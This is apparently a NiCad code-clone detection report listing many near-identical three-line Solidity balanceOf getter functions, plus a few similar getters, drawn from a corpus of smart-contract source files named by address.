<clones>
<systeminfo processor="nicad6" system="source-code" granularity="functions-consistent" threshold="30%" minlines="3" maxlines="2500"/>
<cloneinfo npcs="9368" npairs="2350055"/>
<runinfo ncompares="14726230" cputime="13757861"/>
<classinfo nclasses="273"/>

<class classid="1" nclones="540" nlines="3" similarity="100">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="28" endline="30" pcid="2">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="62" endline="64" pcid="7620">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="65" endline="67" pcid="8598">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="63" endline="65" pcid="1547">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="66" endline="68" pcid="9360">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="66" endline="68" pcid="9345">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="63" endline="65" pcid="3147">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="59" endline="61" pcid="7051">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="66" endline="68" pcid="3425">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="67" endline="69" pcid="7859">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="66" endline="68" pcid="818">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="65" endline="67" pcid="9330">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="64" endline="66" pcid="7325">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="66" endline="68" pcid="9020">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="69" endline="71" pcid="6924">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xFEE08Ecff5BcacCe2EdE4484240b2658F530Ea7E.sol" startline="49" endline="51" pcid="9323">
    function checkContribution(address user) public view returns (uint256) {
        return buyers[user];
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="64" endline="66" pcid="3005">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="65" endline="67" pcid="3578">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="66" endline="68" pcid="5447">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="67" endline="69" pcid="2418">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="67" endline="69" pcid="6716">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="65" endline="67" pcid="1948">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="24" endline="26" pcid="9029">
    function balanceOf(address account) public view returns (uint256) {
        return t[account];
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="67" endline="69" pcid="6792">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="62" endline="64" pcid="6580">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="65" endline="67" pcid="124">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="30" endline="32" pcid="603">
    function balanceOf(address account) public view returns (uint256) {
        return y[account];
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="47" endline="49" pcid="4119">
    function balanceOf(address account) public view returns (uint256) {
        return _balance[account];
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="390" endline="392" pcid="5281">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="62" endline="64" pcid="1459">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="64" endline="66" pcid="6149">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="64" endline="66" pcid="6333">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="68" endline="70" pcid="4475">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="63" endline="65" pcid="5924">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="66" endline="68" pcid="8303">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="63" endline="65" pcid="5529">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="59" endline="61" pcid="6183">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="35" endline="37" pcid="1343">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="64" endline="66" pcid="3192">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="64" endline="66" pcid="2784">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="390" endline="392" pcid="9312">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="399" endline="401" pcid="9102">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="63" endline="65" pcid="5372">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="68" endline="70" pcid="8468">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="63" endline="65" pcid="5878">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="62" endline="64" pcid="8348">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="63" endline="65" pcid="2672">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="65" endline="67" pcid="4076">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="271" endline="273" pcid="4453">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="400" endline="402" pcid="5810">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="46" endline="48" pcid="3850">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="60" endline="62" pcid="4886">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="66" endline="68" pcid="2911">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="67" endline="69" pcid="1064">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="65" endline="67" pcid="5643">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="65" endline="67" pcid="693">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="66" endline="68" pcid="1640">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="67" endline="69" pcid="4741">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="66" endline="68" pcid="6669">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="62" endline="64" pcid="8990">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="64" endline="66" pcid="1220">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="62" endline="64" pcid="1019">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="66" endline="68" pcid="7712">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="66" endline="68" pcid="1399">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="66" endline="68" pcid="1488">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="63" endline="65" pcid="663">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="64" endline="66" pcid="2642">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="65" endline="67" pcid="3177">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="67" endline="69" pcid="8721">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="66" endline="68" pcid="2702">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="65" endline="67" pcid="3207">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="64" endline="66" pcid="2539">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="62" endline="64" pcid="6134">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="66" endline="68" pcid="4659">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="399" endline="401" pcid="28">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="67" endline="69" pcid="5975">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="63" endline="65" pcid="1258">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="63" endline="65" pcid="7426">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="65" endline="67" pcid="2266">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="67" endline="69" pcid="1508">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="66" endline="68" pcid="6969">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="37" endline="39" pcid="1350">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="66" endline="68" pcid="4154">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="69" endline="71" pcid="402">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="68" endline="70" pcid="2079">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="65" endline="67" pcid="9042">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="66" endline="68" pcid="2734">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="66" endline="68" pcid="6228">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="135" endline="137" pcid="3815">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="64" endline="66" pcid="417">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="62" endline="64" pcid="5763">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="64" endline="66" pcid="5608">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="64" endline="66" pcid="959">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="66" endline="68" pcid="3563">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="64" endline="66" pcid="5215">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="67" endline="69" pcid="4269">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="62" endline="64" pcid="5387">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="390" endline="392" pcid="3026">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="62" endline="64" pcid="2990">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="64" endline="66" pcid="6278">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="66" endline="68" pcid="4331">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="61" endline="63" pcid="9291">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="64" endline="66" pcid="246">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="66" endline="68" pcid="7803">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="67" endline="69" pcid="5688">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="66" endline="68" pcid="6565">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="63" endline="65" pcid="139">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="59" endline="61" pcid="1625">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="400" endline="402" pcid="7909">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="65" endline="67" pcid="2183">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="63" endline="65" pcid="9057">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="62" endline="64" pcid="8363">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="65" endline="67" pcid="5939">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="63" endline="65" pcid="2881">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="62" endline="64" pcid="7834">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="61" endline="63" pcid="8613">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="67" endline="69" pcid="2247">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="28" endline="30" pcid="2472">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="67" endline="69" pcid="4000">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="126" endline="128" pcid="3513">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="64" endline="66" pcid="2866">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="76" endline="78" pcid="7727">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="63" endline="65" pcid="7264">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="63" endline="65" pcid="9276">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="62" endline="64" pcid="3803">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="49" endline="51" pcid="8046">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="61" endline="63" pcid="2146">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="66" endline="68" pcid="462">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="68" endline="70" pcid="8288">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="62" endline="64" pcid="3985">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="135" endline="137" pcid="3159">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="63" endline="65" pcid="3222">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="49" endline="51" pcid="4913">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="69" endline="71" pcid="8167">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="60" endline="62" pcid="1429">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="62" endline="64" pcid="8453">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="69" endline="71" pcid="577">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="66" endline="68" pcid="3868">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="66" endline="68" pcid="7066">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="65" endline="67" pcid="4605">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="63" endline="65" pcid="8583">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="63" endline="65" pcid="6809">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="65" endline="67" pcid="7036">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="63" endline="65" pcid="6378">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="64" endline="66" pcid="3057">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="64" endline="66" pcid="5960">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="65" endline="67" pcid="8531">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
